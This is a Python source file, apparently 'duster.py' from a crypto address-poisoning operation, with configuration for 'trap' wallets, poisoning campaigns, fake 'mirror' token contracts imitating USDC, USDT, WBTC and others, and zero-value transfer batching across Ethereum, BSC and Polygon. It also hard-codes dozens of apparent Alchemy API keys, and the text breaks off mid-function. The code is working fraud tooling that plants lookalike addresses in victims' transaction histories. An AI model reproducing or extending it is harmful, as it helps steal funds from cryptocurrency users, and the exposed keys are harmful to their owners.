#!/usr/bin/env python3
import sys
import os
import re
import time
import argparse
import json
import urllib.request
from datetime import datetime, timezone
from web3 import Web3
from dotenv import load_dotenv
from web3.exceptions import TimeExhausted

# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
load_dotenv(override=False)

# --- Gas Reserve Configuration ---
# Amount in USD to keep as a reserve in the trap wallet for future gas fees
GAS_RESERVE_USD = float(os.getenv("GAS_RESERVE_USD", "0.20"))

# --- Real zero-value dust configuration ---
DUST_MODE = (os.getenv("DUST_MODE") or "fake").strip().lower()
if DUST_MODE not in ("fake", "real", "both"):
    DUST_MODE = "fake"

REAL_DUST_ENABLED = DUST_MODE in ("real", "both")
REAL_DUST_DEFAULT_ASSET = (os.getenv("REAL_DUST_DEFAULT_ASSET") or "USDT").strip().upper()
REAL_DUST_GAS_LIMIT = int(os.getenv("REAL_DUST_GAS_LIMIT", "80000"))
REAL_DUST_MAX_RETRIES = max(1, int(os.getenv("REAL_DUST_MAX_RETRIES", "2")))
REAL_DUST_RETRY_DELAY_SECONDS = max(1, int(os.getenv("REAL_DUST_RETRY_DELAY_SECONDS", "3")))

# Hard real-zero gas cap. This keeps real dust firing only when max fee <= cap.
REAL_DUST_MAX_GWEI = float(os.getenv("REAL_DUST_MAX_GWEI", os.getenv("AUTO_DUST_MAX_GWEI", "0.06")))
REAL_DUST_MIN_TIP_GWEI = float(os.getenv("REAL_DUST_MIN_TIP_GWEI", os.getenv("AUTO_DUST_MIN_TIP_GWEI", "0.001")))
REAL_DUST_GAS_MARGIN_GWEI = float(os.getenv("REAL_DUST_GAS_MARGIN_GWEI", os.getenv("AUTO_DUST_GAS_MARGIN_GWEI", "0.0005")))
REAL_DUST_GAS_CHECK_SECONDS = max(1, int(os.getenv("REAL_DUST_GAS_CHECK_SECONDS", os.getenv("AUTO_DUST_GAS_CHECK_SECONDS", "9"))))
REAL_DUST_BASE_FEE_SAFETY_FACTOR = max(
    1.0,
    float(os.getenv("REAL_DUST_BASE_FEE_SAFETY_FACTOR", os.getenv("AUTO_DUST_BASE_FEE_SAFETY_FACTOR", "1.125")))
)

# Optional DB tracking. Keep false unless your Supabase traps table has:
# zero_dust_count and last_zero_dusted_at columns.
REAL_DUST_UPDATE_ZERO_COUNT = (os.getenv("REAL_DUST_UPDATE_ZERO_COUNT") or "false").strip().lower() in ("1", "true", "yes", "on")

# Optional real-zero batch router. If unset, duster uses individual transferFrom fallback.
REAL_ZERO_BATCH_ROUTER = (os.getenv("REAL_ZERO_BATCH_ROUTER") or "").strip()
REAL_ZERO_BATCH_CHUNK_SIZE = max(1, min(1000, int(os.getenv("REAL_ZERO_BATCH_CHUNK_SIZE", "200"))))
REAL_ZERO_BATCH_BASE_GAS = int(os.getenv("REAL_ZERO_BATCH_BASE_GAS", "120000"))
REAL_ZERO_BATCH_PER_TRANSFER_GAS = int(os.getenv("REAL_ZERO_BATCH_PER_TRANSFER_GAS", "80000"))

REAL_TOKEN_FALLBACK_ADDRESSES = {
    "ethereum": {
        "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "USDC": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
        "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    },
    "bsc": {
        "USDT": "0x55d398326f99059fF775485246999027B3197955",
        "USDC": "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
        "DAI": "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
        "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    },
    "polygon": {
        "USDT": "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
        "USDC": "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",
        "DAI": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
        "WETH": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
        "WMATIC": "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
    },
}

print(f"[DEBUG] DUST_MODE={DUST_MODE}, REAL_DUST_ENABLED={REAL_DUST_ENABLED}, REAL_DUST_DEFAULT_ASSET={REAL_DUST_DEFAULT_ASSET}, REAL_DUST_MAX_GWEI={REAL_DUST_MAX_GWEI}")
print(f"[DEBUG] REAL_ZERO_BATCH_ROUTER={REAL_ZERO_BATCH_ROUTER or 'unset'}, REAL_ZERO_BATCH_CHUNK_SIZE={REAL_ZERO_BATCH_CHUNK_SIZE}")

# --- Official POA middleware import ---
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import poa
        geth_poa_middleware = poa
    except ImportError:
        try:
            from web3.middleware import geth_poa
            geth_poa_middleware = geth_poa
        except ImportError:
            geth_poa_middleware = None
            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import decrypt

# --- Supabase client for job tracking ---
try:
    from supabase import create_client
except ImportError:
    create_client = None

SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
supabase = None
if SUPABASE_URL and SUPABASE_KEY and create_client:
    # 🚀 FIX: Compatible with both Supabase v1.x and v2.x+
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    
    # Manually patch the underlying HTTP client timeout if it exists
    try:
        import httpx
        timeout_config = httpx.Timeout(60.0, connect=10.0)
        if hasattr(supabase, '_client') and hasattr(supabase._client, 'timeout'):
            supabase._client.timeout = timeout_config
    except Exception:
        pass # Silently ignore if httpx isn't available or structure changed
    print("[DEBUG] Supabase client initialized successfully")

# ─── Read preferred asset from environment (set by re_poison.js) ───
PREFERRED_ASSET = os.getenv("DUST_ASSET")
if PREFERRED_ASSET:
    print(f'[DEBUG] PREFERRED_ASSET from env: {PREFERRED_ASSET}')
else:
    print('[DEBUG] No PREFERRED_ASSET set, will use default fallback')

def update_job(job_id, status=None, progress=None, total=None, message=None):
    """Update job status in Supabase with proper ISO timestamps."""
    if not supabase or not job_id:
        return
    data = {}
    if status is not None:
        data["status"] = status
    if progress is not None:
        data["progress"] = progress
    if total is not None:
        data["total"] = total
    if message is not None:
        data["message"] = message
        
    iso_now = datetime.now(timezone.utc).isoformat()
    if status == "running" and "started_at" not in data:
        data["started_at"] = iso_now
    if status in ("completed", "failed"):
        data["completed_at"] = iso_now

    if not data:
        return

    try:
        supabase.table("jobs").update(data).eq("id", job_id).execute()
    except Exception as e:
        logger.error(f"Failed to update job {job_id}: {e}")

def get_campaign_id_from_job(job_id):
    """Retrieve campaign_id from job record."""
    if not supabase:
        return None
    try:
        result = supabase.table("jobs").select("campaign_id").eq("id", job_id).execute()
        if result.data:
            return result.data[0]["campaign_id"]
    except Exception as e:
        logger.error(f"Failed to get campaign_id for job {job_id}: {e}")
    return None

print('[DEBUG] Starting duster.py...')

# --- MULTI‑CHAIN: STRICT PM2 Env Var Prioritization ---
CHAIN = os.getenv('CHAIN') or getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None

if chain_cfg and 'tokens' in chain_cfg:
    TOKEN_CONFIG = chain_cfg['tokens']
else:
    TOKEN_CONFIG = config.TOKEN_CONFIG

if chain_cfg and 'dust' in chain_cfg:
    DUST_AMOUNT = chain_cfg['dust']
else:
    DUST_AMOUNT = config.DUST_AMOUNT

NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'

if hasattr(config, 'get_chain_rpc'):
    RPC_URL = config.get_chain_rpc()
else:
    RPC_URL = config.DUSTER_RPC_URL

if RPC_URL is None or RPC_URL == "":
    RPC_URL = os.getenv("DUSTER_RPC_URL") or os.getenv("NODE_RPC_URL")

print(f'[DEBUG] Chain: {CHAIN}, Native symbol: {NATIVE_SYMBOL}')
print('[DEBUG] DUST_AMOUNT:', DUST_AMOUNT)
print('[DEBUG] TOKEN_CONFIG:', TOKEN_CONFIG)
print(f'[DEBUG] Using RPC: {RPC_URL}')

# --- Custom HTTPProvider that truncates extraData for POA chains ---
class POAHTTPProvider(Web3.HTTPProvider):
    def make_request(self, method, params):
        response = super().make_request(method, params)
        if method in ('eth_getBlockByNumber', 'eth_getBlockByHash'):
            if 'result' in response and 'extraData' in response['result']:
                extra = response['result']['extraData']
                if isinstance(extra, str):
                    extra_bytes = bytes.fromhex(extra[2:] if extra.startswith('0x') else extra)
                else:
                    extra_bytes = extra
                if len(extra_bytes) > 32:
                    response['result']['extraData'] = '0x' + extra_bytes[:32].hex()
        return response

# Handle POA middleware import across different web3.py versions
try:
    from web3.middleware import geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
    except ImportError:
        geth_poa_middleware = None


# ─── Public RPC fallbacks (Verified High-Availability Nodes) ───
PUBLIC_RPC_FALLBACKS = {
    'bsc': [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  'polygon': [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  'ethereum': [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
}

# ─── Alchemy RPCs for deep history fetching ───
ALCHEMY_RPCS = {
    'bsc': [
        'https://bnb-mainnet.g.alchemy.com/v2/alch_DMA2jJjcrOWJ9R10_Fx5k',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_bBpETSAAmA8VjshNMBkLn',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_VJ0_4LOGnzlbo7NPkqhg-',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
         'https://bnb-mainnet.g.alchemy.com/v2/alch_3_Bpj7ORVica5UbSitOXm',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_AMGRdQ1DjpCspfYgaJWk8',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_n0iXFk0U2atdbZFyJw3Vd',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_uG-HMTi_h9uFfpZ0IPtUC',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Of_5h7lrnjaNskMMN1m_O',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_JXJn_G0u41v-ORLH-PLvm',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6DY1YYDbhjfaDTRvVlb8E',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_FY7h0VVmtvSHzWHULlBYD',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_e2hNo6urdy-p9K3iCKBRz',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_wT_5s_3jEKZRUHS6-9qlB',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_xo7rkNtpCG3XTTte_34Oe',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh',
    ],
    'polygon': [
        'https://polygon-mainnet.g.alchemy.com/v2/alch_qfGoxus-szPvLI44z9YWw',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_fcNea90VExKd5DNvSguRa',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_sr3YXfVMNVZJ5qSCU0kyD',
         'https://polygon-mainnet.g.alchemy.com/v2/alch_6bgVHMAQFQbOqC7cHZ5tU',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_e1PIp-UVXQ1jZWINkbmDm',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_n9bFKwbW1lFSXd-CTjFA8',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_VXeIGTUmcC8G4X4a4Lx8e',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_adXxpjamb8lNBSSnH-dZF',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_vUHRCAI2B5z-NVbge5MjR',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_YXuYd2T6nO-_ASx3VyYd8',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_o4lfkzzsAyG0uEFq9cfx0',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_6vT8KHKebKLX2IzQCgHpo',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_C7D8h3Jq99k3QweZHq1Ip',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_1t_00WgSdtEqIYYRY8LdA',
        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11',
    ],
    'ethereum': [
        'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
        'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
        'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
         'https://eth-mainnet.g.alchemy.com/v2/alch_3smRQUoTzfj_NPiK6451s',
    'https://eth-mainnet.g.alchemy.com/v2/alch_xp0ppatuXONHI2pClS7_M',
    'https://eth-mainnet.g.alchemy.com/v2/alch_hmts-IFXko93muF8BaX5Q',
    'https://eth-mainnet.g.alchemy.com/v2/alch_8fJp6NiVdGxCOljdKCDZi',
    'https://eth-mainnet.g.alchemy.com/v2/alch_4euFfPOpJDglYNRQYKWhO',
    'https://eth-mainnet.g.alchemy.com/v2/alch_bjwK80RPIzP774OVkp-vE',
    'https://eth-mainnet.g.alchemy.com/v2/alch_LcoDsDwyyl7fbYUvffKYC',
    'https://eth-mainnet.g.alchemy.com/v2/alch_btTtYZmxG7VfNjY_jZIJr',
    'https://eth-mainnet.g.alchemy.com/v2/alch_IP1SsCj0wqzZqrvhH_Rv5',
    'https://eth-mainnet.g.alchemy.com/v2/alch_1O0yoHMsrXCOe3lOHu7dc',
    'https://eth-mainnet.g.alchemy.com/v2/alch_w2NDE7Pilr5cpIPb51Wsx',
        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
    ],
}


# ─── Mirror Token Contracts ───
# Stablecoins
MIRROR_TOKEN_USDC = os.getenv("MIRROR_TOKEN_USDC")
MIRROR_TOKEN_USDT = os.getenv("MIRROR_TOKEN_USDT")
MIRROR_TOKEN_DAI = os.getenv("MIRROR_TOKEN_DAI")
MIRROR_TOKEN_EURC = os.getenv("MIRROR_TOKEN_EURC")
MIRROR_TOKEN_EURCV = os.getenv("MIRROR_TOKEN_EURCV")

# Wrapped tokens
MIRROR_TOKEN_WBTC = os.getenv("MIRROR_TOKEN_WBTC")
MIRROR_TOKEN_cbETH = os.getenv("MIRROR_TOKEN_cbETH")
MIRROR_TOKEN_WETH = os.getenv("MIRROR_TOKEN_WETH")

# DeFi tokens
MIRROR_TOKEN_LINK = os.getenv("MIRROR_TOKEN_LINK")
MIRROR_TOKEN_AAVE = os.getenv("MIRROR_TOKEN_AAVE")
MIRROR_TOKEN_ENA = os.getenv("MIRROR_TOKEN_ENA")
MIRROR_TOKEN_CHEX = os.getenv("MIRROR_TOKEN_CHEX")

# Meme coins
MIRROR_TOKEN_SHIB = os.getenv("MIRROR_TOKEN_SHIB")
MIRROR_TOKEN_PEPE = os.getenv("MIRROR_TOKEN_PEPE")
MIRROR_TOKEN_DOGE = os.getenv("MIRROR_TOKEN_DOGE")
MIRROR_TOKEN_BONK = os.getenv("MIRROR_TOKEN_BONK")

# Other tokens
MIRROR_TOKEN_WLFI = os.getenv("MIRROR_TOKEN_WLFI")
MIRROR_TOKEN_HEX = os.getenv("MIRROR_TOKEN_HEX")
MIRROR_TOKEN_CRCLon = os.getenv("MIRROR_TOKEN_CRCLon")

# Native coins
MIRROR_TOKEN_NATIVE = os.getenv("MIRROR_TOKEN_NATIVE")

MIRROR_CONTRACTS = {
    # Stablecoins
    "USDC": MIRROR_TOKEN_USDC,
    "USDT": MIRROR_TOKEN_USDT,
    "DAI": MIRROR_TOKEN_DAI,
    "EURC": MIRROR_TOKEN_EURC,
    "EURCV": MIRROR_TOKEN_EURCV,
    
    # Wrapped tokens
    "WBTC": MIRROR_TOKEN_WBTC,
    "cbETH": MIRROR_TOKEN_cbETH,
    "WETH": MIRROR_TOKEN_WETH,
    
    # DeFi tokens
    "LINK": MIRROR_TOKEN_LINK,
    "AAVE": MIRROR_TOKEN_AAVE,
    "ENA": MIRROR_TOKEN_ENA,
    "CHEX": MIRROR_TOKEN_CHEX,
    
    # Meme coins
    "SHIB": MIRROR_TOKEN_SHIB,
    "PEPE": MIRROR_TOKEN_PEPE,
    "DOGE": MIRROR_TOKEN_DOGE,
    "BONK": MIRROR_TOKEN_BONK,
    
    # Other tokens
    "WLFI": MIRROR_TOKEN_WLFI,
    "HEX": MIRROR_TOKEN_HEX,
    "CRCLon": MIRROR_TOKEN_CRCLon,
    
    # Native coins (all use the same contract)
    "ETH": MIRROR_TOKEN_NATIVE,
    "BNB": MIRROR_TOKEN_NATIVE,
    "MATIC": MIRROR_TOKEN_NATIVE,
}

MIRROR_ABI = json.loads('[{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"name":"execute","outputs":[],"stateMutability":"nonpayable","type":"function"}]')

# ─── Multi-Token Router Configuration ───
MULTI_TOKEN_ROUTER = os.getenv("MULTI_TOKEN_ROUTER")
MULTI_TOKEN_ROUTER_ABI = json.loads('[{"inputs":[{"components":[{"internalType":"address","name":"target","type":"address"},{"internalType":"address[]","name":"froms","type":"address[]"},{"internalType":"address[]","name":"tos","type":"address[]"},{"internalType":"uint256[]","name":"values","type":"uint256[]"}],"internalType":"struct MultiTokenBatchRouter.BatchCall[]","name":"calls","type":"tuple[]"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"}]')
def get_token_decimals(asset_symbol):
    """Get the correct number of decimals for a token symbol."""
    decimals_map = {
        # Native coins (18 decimals)
        'ETH': 18,
        'BNB': 18,
        'MATIC': 18,
        'WETH': 18,
        'WBNB': 18,
        'WMATIC': 18,
        
        # Stablecoins with 6 decimals
        'USDC': 6,
        'USDT': 6,
        'EURC': 6,
        'USDP': 6,
        'BUSD': 6,
        
        # Stablecoins with 18 decimals
        'DAI': 18,
        'EURCV': 18,
        'TUSD': 18,
        'FRAX': 18,
        
        # Bitcoin variants (8 decimals)
        'WBTC': 8,
        'renBTC': 8,
        
        # DeFi tokens (18 decimals)
        'LINK': 18,
        'AAVE': 18,
        'ENA': 18,
        'CHEX': 18,
        'cbETH': 18,
        
        # Meme coins
        'SHIB': 18,
        'PEPE': 18,
        'DOGE': 18,
        'BONK': 5,  # BONK uses 5 decimals
        
        # Other tokens
        'WLFI': 18,
        'HEX': 8,  # HEX uses 8 decimals
        'CRCLon': 18,
    }
    
    symbol = asset_symbol.upper()
    decimals = decimals_map.get(symbol)
    
    if decimals is None:
        logger.warning(f"Unknown token '{asset_symbol}', defaulting to 18 decimals")
        return 18
    
    return decimals


def is_native_asset_for_real_dust(asset_symbol):
    s = str(asset_symbol or "").upper()
    native = str(NATIVE_SYMBOL or "").upper()
    return s in (
        "ETH",
        "BNB",
        "MATIC",
        "POL"
    ) or s == native


def get_real_token_address(asset_symbol):
    symbol = str(asset_symbol or "").strip().upper()
    if not symbol or is_native_asset_for_real_dust(symbol):
        symbol = REAL_DUST_DEFAULT_ASSET

    addr = None
    try:
        addr = TOKEN_CONFIG.get(symbol) or TOKEN_CONFIG.get(symbol.upper())
    except Exception:
        addr = None

    if not addr:
        fallback = REAL_TOKEN_FALLBACK_ADDRESSES.get(str(CHAIN).lower(), {})
        addr = fallback.get(symbol)

    if not addr:
        fallback = REAL_TOKEN_FALLBACK_ADDRESSES.get(str(CHAIN).lower(), {})
        addr = fallback.get(REAL_DUST_DEFAULT_ASSET)

    return addr


def choose_real_dust_asset(last_transfer_asset):
    asset = str(last_transfer_asset or "").strip().upper()
    if not asset or is_native_asset_for_real_dust(asset):
        return REAL_DUST_DEFAULT_ASSET
    if get_real_token_address(asset):
        return asset
    return REAL_DUST_DEFAULT_ASSET


def get_real_dust_gas_params(w3, context="[real-zero]", campaign_id=None):
    """
    Real-zero hard gas cap.
    Fires only when effective base fee + min tip + margin <= REAL_DUST_MAX_GWEI.
    """
    target_wei = w3.to_wei(REAL_DUST_MAX_GWEI, "gwei")
    min_tip_wei = w3.to_wei(REAL_DUST_MIN_TIP_GWEI, "gwei")
    margin_wei = w3.to_wei(REAL_DUST_GAS_MARGIN_GWEI, "gwei")

    checks = 0

    while True:
        checks += 1

        try:
            latest_block = call_with_retry(w3.eth.get_block, "latest")
            base_fee = latest_block.get("baseFeePerGas")

            if base_fee is not None:
                base_fee_wei = int(base_fee)
                safety_base_wei = int(base_fee_wei * REAL_DUST_BASE_FEE_SAFETY_FACTOR)
                effective_base_wei = max(base_fee_wei, safety_base_wei)

                base_fee_gwei = float(w3.from_wei(base_fee_wei, "gwei"))
                effective_base_gwei = float(w3.from_wei(effective_base_wei, "gwei"))
                target_gwei = float(w3.from_wei(target_wei, "gwei"))

                if effective_base_wei + min_tip_wei + margin_wei <= target_wei:
                    max_fee_wei = target_wei
                    available_tip_wei = max(0, max_fee_wei - effective_base_wei)
                    tip_wei = min(min_tip_wei, available_tip_wei)

                    if tip_wei == 0 and max_fee_wei > effective_base_wei:
                        tip_wei = 1

                    gas_params = {
                        "maxFeePerGas": max_fee_wei,
                        "maxPriorityFeePerGas": tip_wei,
                    }

                    msg = (
                        f"✅ *Gas Strategy: Cheap Gas Sniped!* _(Real Zero-Dust)_\n\n"
                        f"🧾 Context: `{context}`\n"
                        f"⛽ *Firing max fee:* `{float(w3.from_wei(max_fee_wei, 'gwei')):.6f} Gwei`\n"
                        f"📉 Effective base fee: `{effective_base_gwei:.6f} Gwei`\n"
                        f"🟦 Latest base fee: `{base_fee_gwei:.6f} Gwei`\n"
                        f"💡 Priority tip: `{float(w3.from_wei(tip_wei, 'gwei')):.6f} Gwei`\n"
                        f"🎯 Hard cap: `<= {REAL_DUST_MAX_GWEI:.6f} Gwei`\n"
                        f"🛡️ Safety margin: `{REAL_DUST_GAS_MARGIN_GWEI:.6f} Gwei`\n"
                        f"⚠️ Base-fee safety factor: `{REAL_DUST_BASE_FEE_SAFETY_FACTOR:.3f}x`"
                    )

                    logger.info(msg)
                    if campaign_id:
                        send_telegram(msg, campaign_id=campaign_id)

                    return gas_params

                logger.info(
                    f"{context} check #{checks} | effective base fee {effective_base_gwei:.6f} Gwei "
                    f"> safe ceiling for cap {target_gwei:.6f} Gwei | "
                    f"next check in {REAL_DUST_GAS_CHECK_SECONDS}s"
                )

            else:
                gas_price = call_with_retry(w3.eth.gas_price)
                gas_gwei = float(w3.from_wei(gas_price, "gwei"))
                target_gwei = float(w3.from_wei(target_wei, "gwei"))

                if gas_price + margin_wei <= target_wei:
                    gas_params = {"gasPrice": target_wei}

                    msg = (
                        f"✅ *Gas Strategy: Cheap Gas Sniped!* _(Real Zero-Dust Legacy)_\n\n"
                        f"🧾 Context: `{context}`\n"
                        f"⛽ *Firing gasPrice:* `{target_gwei:.6f} Gwei`\n"
                        f"📈 Current gasPrice: `{gas_gwei:.6f} Gwei`\n"
                        f"🎯 Hard cap: `<= {REAL_DUST_MAX_GWEI:.6f} Gwei`\n"
                        f"🛡️ Safety margin: `{REAL_DUST_GAS_MARGIN_GWEI:.6f} Gwei`"
                    )

                    logger.info(msg)
                    if campaign_id:
                        send_telegram(msg, campaign_id=campaign_id)

                    return gas_params

                logger.info(
                    f"{context} check #{checks} | legacy gasPrice {gas_gwei:.6f} Gwei "
                    f"> safe ceiling for cap {target_gwei:.6f} Gwei | "
                    f"next check in {REAL_DUST_GAS_CHECK_SECONDS}s"
                )

        except Exception as e:
            logger.warning(f"{context} gas check failed: {e}")

        time.sleep(REAL_DUST_GAS_CHECK_SECONDS)


# Mirror uses the campaign funding wallet as operator (same as re_poison.js)
def get_mirror_operator_key(campaign_id):
    """Fetch and decrypt the funding key for mirror operations."""
    if not supabase or not campaign_id:
        return None
    try:
        result = supabase.table("campaigns").select("funding_private_key_enc").eq("id", campaign_id).execute()
        if not result.data:
            return None
        enc_key = result.data[0].get("funding_private_key_enc")
        if not enc_key:
            return None
        funding_key = decrypt(enc_key).strip()
        if not funding_key.startswith('0x'):
            funding_key = f'0x{funding_key}'
        return funding_key
    except Exception as e:
        logger.error(f"Failed to get mirror operator key: {e}")
        return None


def send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Mirror"):
    """Send a rate-limited Telegram alert for insufficient gas (once per hour per wallet)."""
    now = time.time()
    last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
